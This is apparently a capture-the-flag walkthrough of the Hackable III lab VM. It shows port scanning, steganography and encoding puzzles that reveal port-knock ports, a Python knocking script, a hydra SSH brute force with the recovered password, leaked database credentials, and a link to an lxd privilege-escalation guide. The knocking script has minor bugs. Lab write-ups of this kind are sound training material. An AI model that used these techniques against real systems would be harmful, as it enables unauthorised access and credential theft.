------------------------------------------------------------------------------------------------
NMAP
------------------------------------------------------------------------------------------------
root@kali ~# nmap -sS -A -T4 -p- 10.0.0.17

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh                                                                                       
80/tcp open     http    Apache httpd 2.4.46 ((Ubuntu))                                                    
|_http-title: Kryptos - LAN Home                                                                          
| http-robots.txt: 1 disallowed entry                                                                     
|_/config                                                                                                 
|_http-server-header: Apache/2.4.46 (Ubuntu) 

Port 22 (SSH) is filtered on the machine, let's enumerate HTTP and try to find a way to gain access to the port.
------------------------------------------------------------------------------------------------
HTTP
------------------------------------------------------------------------------------------------
Found a comment on http://10.0.0.17:

<!-- "Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com" -->

We can infer that 'jubiscleudo' is a username on the machine. The comment stats that the machine is using Port Knocking (Port Knocking is a method of extarnally opening ports on a machine by generating a connection attampt on a set of prespicified ports. Unless the attacker send the correct knock sequence, the protected ports will apear closed, or in our case filtered).

The comment also mentioned that there are .jpg that hold information.

root@kali ~/D/C/HackableIII# gobuster dir -u http://10.0.0.17 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x html,bak,zip,txt,jpg

/3.jpg                (Status: 200) [Size: 61259]
/robots.txt           (Status: 200) [Size: 33]   
/config               (Status: 301) [Size: 307] [--> http://10.0.0.17/config/]
/css                  (Status: 301) [Size: 304] [--> http://10.0.0.17/css/]   
/js                   (Status: 301) [Size: 303] [--> http://10.0.0.17/js/]    
/imagens              (Status: 301) [Size: 308] [--> http://10.0.0.17/imagens/]
/backup               (Status: 305) [Size: 305] [--> http://10.0.0.17/backup/]

We found the jpg that was mentioned in the comment. After downloading it to our local machine, I tried using the strings command to see if the the content of the file holds any secret information but it didn't work.
I used the command 'steghide' to see if the file has any embedded files.

root@kali ~/D/C/HackableIII# steghide extract -sf 3.jpg
Enter passphrase: 
wrote extracted data to "steganopayload148505.txt".

steganopayload148505.txt 
port:65535

We found the first port!!!

The /config directory on http://10.0.0.17 has a txt file.

1.txt:
MTAwMDA=

Base64 decode: 10000

We found another port.

Going to the /backup directory we found a wordlist that we will probably use to brute force using the username we found.

We can find 2.txt in /css:

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....

Brainf*ck Execute: 4444

We found the final port.

We have the ports [65535,10000,4444] for use to be able to perform Port Knocking on the machine and open port 22.

I wrote this python script that generates all combinations for the 3 ports and knocks on them.


{
	import os
	import socket
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	IP = "10.0.0.17"
	SSH = 22
	target_ip = socket.gethostbyname(IP)
	ports = [10000 ,4444 ,65535]
	
	def knock(arr):
	    for p in ports:
 			os.system("telnet " + str(IP) + " " + str(p))
	
	def scanPort(port):
	    try:
	        s.connect((target_ip, port))
	        return True
	    except:
	        return False
	
	def isHostUp(ip):
	    response = os.popen(f"ping -n 1 -w 2 " + ip).read()
	    if "Received = 1" in response:
	        return True
	    return False
	
	def swap(arr, i, j):
	    temp = arr[i]
	    arr[i] = arr[j]
	    arr[j] = temp
	
	def possiblePermutations(arr, index):
	    if scanPort(SSH) == True:
	        print("[+] SSH is up\nCorrent Squence: ")
	        print(arr)
	        return
	    
	    if index == 1:
	        print(arr)
	        knock(arr)
	    else:
	        for i in range(index - 1):
	            possiblePermutations(arr, index -1)
	
	            if(index % 2 == 0):
	                swap(arr, i, index - 1)
	            else:
	                swap(arr, 0, index -1)
	        
	        possiblePermutations(arr, index - 1)
	
	if(isHostUp(target_ip)):
	    print("[+] Scanning "  + target_ip + "...") # Check if host is up and can be scanned
	
	    possiblePermutations(ports, len(ports))
	    
	else:
	    print("Host Is Not Up!")
	
}
We can also use the command 'knock'.

root@kali ~/D/C/HackableIII# nmap -T5 -p22 10.0.0.17

PORT   STATE SERVICE
22/tcp open  ssh

After running the script we can nmap port 22 and see that is is open.
After port knocking we can brute force ssh with the wordlist that we found and the username 'jubiscleudo'.

root@kali ~/D/C/HackableIII# hydra -l 'jubiscleudo' -P wordlist.txt ssh://10.0.0.17 -V -I

[22][ssh] host: 10.0.0.17   login: jubiscleudo   password: onlymy

Once we are logged in we can read the .user.txt on the home folder.

.user.txt:

%                                              ,%&&%#.                                              
%                                         *&&&&%%&%&&&&&&%                                          
%                                       &&&&            .%&&&                                       
%                                     &&&#                 %&&&                                     
%                                   /&&&                     &&&.                                   
%                                  %&%/                       %&&*                                  
%                                 .&&#     (%%(,     ,(&&*     %&&                                  
%                                 &&%    %&&&&&&&&&&&&&&%&%#    &&&                                 
%                                 &&%&&&&&&&   #&&&&&*   &&&&&&&%&%                                 
%                                 &&&&&&&&&&&&&&,   /&&&&&&&&&&&&&&                                 
%                                 &&&&&&&%                 &&&&&&&&                                 
%                                  %&&%&&&&              /&&&%&&&%                                  
%                                 &.%&&% %&&%           &&&& %&&/*&                                 
%                              &&&&&&&&&&  %&&&&#   %%&&&&  %&&&&&&&&&                              
%                           /&%&/   *&&&&&&   %&&&&&&%&   &&&&&&.   %&&&.                           
%                          &&&           &&%&           %%%%          .&&&                          
%                         &&%                                           &&&                         
%                        %&&.   *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&    /&&(                        
%                       /&&#   #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   %&&                        
%                       &&%    ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%     %&%                       
%                      &&&      %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&      %&&                      
%                      &&&      &&&&&&&&&&&&&&&%&   %&&&&&&&&&&&&&&&%      &&&                      
%                      %&&&%    &&&&&&&&&&&&&&&&     &&&&&&&&&&&&&&&%    &%&&#                      
%                        &&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                        
%                           &%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                           
%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                
%                                *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                 
%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                
%                                 #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%( 

invite-me: https://www.linkedin.com/in/eliastouguinho/

jubiscleudo@ubuntu20:/home$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
hackable_3:x:1000:1000:hackable_3:/home/hackable_3:/bin/bash
jubiscleudo:x:1001:1001:,,,:/home/jubiscleudo:/bin/bash

There is another user on the machine named hackable_3.

Going to /var/www/html, we can find the file .backup_config.php:

define('DB_USERNAME', 'hackable_3');
define('DB_PASSWORD', 'TrOLLED_3');

jubiscleudo@ubuntu20:/home$ find / -perm /4000 2> /dev/null

Found CVE-2021-44731 but is for version 2.54.2, snapd on the local machine is 2.54.3.
Trying to find a SUID file brings some odd results, files in the directory snap have SUID permissions. Going to the /snap/bin directory we can see that lxc and lxd commands are installed.

I searched for lxd privialge escliation and found this article. It goes by step by step on how to get a root shell using lxd.

Follow the steps on https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

root.txt 
░░█▀░░░░░░░░░░░▀▀███████░░░░
░░█▌░░░░░░░░░░░░░░░▀██████░░░
░█▌░░░░░░░░░░░░░░░░███████▌░░
░█░░░░░░░░░░░░░░░░░████████░░
▐▌░░░░░░░░░░░░░░░░░▀██████▌░░
░▌▄███▌░░░░▀████▄░░░░▀████▌░░
▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░
▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌
▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌
▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌
░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░
░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░
░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░
░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░
░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░
░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░
░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░
░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░
░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░
▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░
░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄
░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░
░░▄▌████████▄▄▄███████▌░░░░░▄
░▄▀░██████████████████▌▀▄░░░░
▀░░░█████▀▀░░░▀███████░░░▀▄░░
░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░
░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀
░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░
░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░
░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░
░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░

invite-me: linkedin.com/in/eliastouguinho
